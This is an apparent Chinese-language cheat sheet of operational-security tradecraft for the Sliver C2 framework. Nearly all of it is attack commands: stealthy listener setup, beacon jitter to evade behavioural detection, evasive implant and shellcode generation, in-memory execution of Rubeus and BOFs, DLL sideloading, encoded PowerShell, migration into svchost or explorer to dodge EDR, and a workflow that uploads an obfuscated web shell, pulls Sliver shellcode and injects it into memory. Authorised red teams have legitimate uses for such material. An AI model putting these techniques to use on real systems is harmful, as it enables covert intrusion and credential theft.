# Sliver — OPSEC 注意事項

## Listener 選擇

| 優先順序 | 協議 | 原因 |
|---------|------|------|
| ✅ 最佳 | HTTPS (443) | 融入正常 HTTPS 流量，難以區分 |
| ✅ 次佳 | DNS (53) | 穿透力強，但速度慢 |
| ⚠️ 普通 | mTLS (443) | 加密但非標準流量特徵 |
| ❌ 避免 | 裸 TCP、預設 Port（4444/8888）| 特徵明顯，易被防火牆/IDS 攔截 |

```bash
# 好：偽裝成 HTTPS
https --lhost 0.0.0.0 --lport 443

# 差：使用預設 Port
mtls --lport 4444
```

---

## Beacon Sleep & Jitter

```bash
# 建議：60 秒 ± 30% Jitter（流量不規律，難以建立基線）
sleep 60s/30

# 長時間潛伏
sleep 300s/50    # 5 分鐘 ± 50%

# 避免固定間隔（易被 UEBA 偵測）
sleep 60s        # 不設 Jitter 是 OPSEC 風險
```

---

## Implant 生成

```bash
# 啟用混淆（減少靜態特徵）
generate --evasion --https <LHOST>:443 --os windows

# Shellcode 格式（配合 Injector 記憶體執行，不落地）
generate --format shellcode --https <LHOST>:443

# 跳過 Debug Symbol（減小體積、降低特徵）
generate --skip-symbols --https <LHOST>:443
```

---

## 執行層面

### 優先記憶體執行（不落地）

```bash
# .NET Assembly 記憶體執行
execute-assembly Rubeus.exe asktgt ...

# BOF 記憶體執行（最 OPSEC 友善）
inline-execute bof.o

# DLL Sideload（偽裝成合法程序）
sideload --process explorer.exe payload.dll
```

### 避免高風險操作

```bash
# 高風險：直接呼叫 cmd.exe / powershell.exe
execute --exe powershell.exe -- -c "IEX(...)..."

# 較低風險：編碼後執行
execute --exe powershell.exe -- -enc <BASE64>

# 更低風險：直接用 execute-assembly 替代 PowerShell
execute-assembly PowerSharpPack.exe ...
```

---

## 程序遷移

```bash
# 遷移到穩定且低可疑程序
ps --exe explorer.exe    # 桌面使用者環境
ps --exe svchost.exe     # 系統服務（多個實例，難以追蹤）

migrate --pid <PID>

# 避免遷移到：
# - lsass.exe（高風險，易觸發 EDR）
# - 臨時程序（calc.exe、notepad.exe）
```

---

## 網路 OPSEC

```bash
# 執行完後立即清理 Pivot / Proxy
socks5 stop --id <ID>
portfwd rm --id <ID>
rportfwd rm --id <ID>

# 盡量複用已有通道，避免開太多連線
```

---

## Web Shell OPSEC

| 方式 | 風險 | 建議 |
|------|------|------|
| msfvenom ASPX | 高（大量 AV 特徵）| 僅在無 AV 環境使用 |
| 混淆 Web Shell | 低 | 使用 [SharPyShell](https://github.com/antonioCoco/SharPyShell) |
| 上傳 Sliver Shellcode | 中 | 配合混淆 + 記憶體執行 |

```bash
# 較 OPSEC 的流程：
# 1. 上傳混淆 Web Shell（SharPyShell）
# 2. 透過 Web Shell 執行指令，下載 Sliver Shellcode
# 3. 透過 Web Shell 觸發 Shellcode 記憶體注入
# 4. 獲得 Sliver Session（不留 Implant 檔案在磁碟）
```

---

## 整體 OPSEC Checklist

- [ ] Listener 使用 443/80/53，避免非標準 Port
- [ ] Beacon Sleep 設定合理 Jitter（建議 ≥ 20%）
- [ ] Implant 生成加入 `--evasion`
- [ ] 優先使用 `execute-assembly` / `inline-execute` 替代落地執行
- [ ] 遷移到穩定程序後再進行敏感操作
- [ ] 操作完成後清理 SOCKS5、Port Forward
- [ ] 避免在 lsass.exe 上直接注入
- [ ] 使用混淆 Web Shell 而非 msfvenom 預設模板
